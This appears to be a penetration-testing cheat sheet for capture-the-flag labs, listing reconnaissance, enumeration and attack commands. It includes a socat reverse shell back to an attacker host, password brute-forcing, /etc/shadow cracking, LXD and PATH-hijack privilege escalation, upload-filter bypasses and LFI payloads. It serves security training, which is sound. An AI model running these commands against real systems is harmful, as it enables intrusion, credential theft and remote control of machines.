Basic Commands & Protocols

File Operations & Search

Common commands for finding files and interacting with the system environment.

# Find file inside a directory, ignoring errors
find ~ -name "flag.txt" 2>/dev/null

# Find files belonging to a specific user
find / -user <username> 2>/dev/null

# Locate files using built-in search
search -f flag.txt

SSH, Telnet & FTP

# Standard SSH Connection
ssh <username>@<IP-adr>

# Private Key Connection (Chmod required first)
chmod 600 id_rsa
ssh -i id_rsa <username>@<IP-adr>

# Telnet connection
telnet <IP-adr> [<port-number>] # e.g. POP3: 110, SMB: 445

# FTP connection
ftp <IP-addr>

Data Retrieval & Network Tools

# HTTP Request with parameters/headers
curl -L <url> -H "Cookie: value" -d "user=robert"

# Text searching
grep "search_term" file_path

# Archiving tools
unzip <filename>
7z x <filename>

# DNS and Domain Lookup
whois <url-addr>
nslookup -type=A aurelstrigac.com 1.1.1.1
dig aurelstrigac.com A

# ICMP and Traceroute
ping -c 4 -s 64 <ip-addr>
traceroute <ip-addr>

Netcat (nc)

# Listen Mode
nc -lvnp <port>

# Connect Mode
nc <ip-addr> <port>

Systemctl

# List running services
systemctl list-units --type=service --state=running

# Investigate service status
systemctl status <service-name>

Pivoting on Servers

POP3 Protocol

USER <username>
PASS <password>
LIST        # Lists emails
RETR <id>   # Retrieves specific email
QUIT        # Leaves session

FTP Protocol

When using the PUT command, ensure the file you intend to upload is in the local active directory from which you initiated the FTP session.

SMB Protocol

# List available shares without authentication
smbclient -L //<IP-adr> -N

# Connect to a share with a user
smbclient //<IP-adr>/<ShareName> -U <username>

# In-session commands
get <file-name>
exit

HTTP Manual Retrieval

GET /filename HTTP/1.1
Host: <target_host>

Service Enumeration

NMAP

# Standard script and version scan
nmap -sV -sC -oN scan.nmap <IP-adr>

# Other TCP scan types
nmap -sT <IP-adr> # TCP Connect
nmap -sS <IP-adr> # SYN Scan (stealthy/fast)
nmap -sN <IP-adr> # Null Scan (no flags set)
nmap -sF <IP-adr> # FIN Scan
nmap -sX <IP-adr> # Xmas Scan (FIN, PSH, URG)

# Discovery and evasion
nmap -PR -sn 10.10.10.0/24         # ARP scan
nmap -PE -sn 10.10.10.0/24         # ICMP Echo Request
nmap -D <decoy1>,<decoy2>,ME <IP>  # Decoy scan

Gobuster

# Directory search
gobuster dir -u http://<IP-adr> -w common.txt -r -x php,txt

# VHost search
gobuster vhost -u "http://<IP-adr>" --domain target.thm -w <wordlist>

ffuf

# Subdomain discovery
ffuf -u http://FUZZ.team.thm -w <wordlist> -fs 0 -k

# Username enumeration (post request validation)
ffuf -w <wordlist> -X POST -d "username=FUZZ&email=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<IP>/signup -mr "username already exists"

# Password Bruteforce
ffuf -w valid_users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -u http://<IP>/login -fc 200

SMB Shares Enumeration

# Active shares scan (enum4linux)
enum4linux -a <IP-adr>

# SMBMap share enumeration
smbmap -H <IP-adr>

John the Ripper

# General cracking
john --wordlist=rockyou.txt hash.txt

# Extract private key passphrase
ssh2john.py id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# Crack /etc/shadow passwords
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --format=sha512crypt --wordlist=rockyou.txt unshadowed.txt

# Zip and Rar files
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
john --wordlist=rockyou.txt hash.txt

Bypassing Web Upload Restrictions

  1. Disable browser Javascript (if processing occurs client-side).
  2. Intercept the request using Burp Suite and manipulate the file extension (e.g., use .phtml or shell.jpg.php).
  3. Prepend image magic bytes (FF D8 FF DB for JPEG) inside a hex editor to spoof server-side inspection.

Socat Encrypted Shells

# Create self-signed cert on listener
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener Setup
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Target Connection Back
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash

Privilege Escalation

Sudo Rights & SUID

# Check current user's privileges
sudo -l

# Search for SUID files
find / -perm -u=s -type f 2>/dev/null

LXC / LXD Escalation

# Build alpine image on local machine
git clone https://github.com/saghul/lxd-alpine-builder.git
sudo ./build-alpine

# Transfer and build container on target
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh # Access local filesystem under /mnt/root

Path Hijacking

# Target executable calls 'cp' relatively instead of using absolute path
echo '#!/bin/bash' > cp
echo '/bin/bash' >> cp
chmod +x cp
export PATH=$PWD:$PATH

Web Application Vulnerabilities

Insecure Direct Object Reference (IDOR)

Occurs when an application relies directly on user-supplied identifiers without validation.

http://online-service.thm/profile?user_id=1001 -> change to 1000

File Inclusion (LFI/RFI)

# LFI path traversal
http://target.thm/index.php?file=../../../../etc/passwd

# Read PHP source via filters
http://target.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/var/www/html/test.php

Cross-Site Scripting (XSS)

  • Reflected: Executed by the client browser via malformed query parameters.
  • Stored: Payload is saved directly in target database.
  • DOM: DOM environment manipulates the vulnerability client-side.

Miscellaneous

Common CVSS/VPR Metrics

  • CVSS (Common Vulnerability Scoring System): Evaluates score severity static across Exploitability, Impact, and CIA Triad elements.
  • VPR (Vulnerability Priority Rating): Dynamic score assessing current threat landscape and likelihood of live exploitation.

Specialized Pentesting Distributions

  • Kali Linux: Platform constructed natively for general penetration testing.
  • REMnux: Target VM customized specifically for malware analysis and digital forensics.
  • FLARE VM: Windows-based operating system designed for reverse engineering.
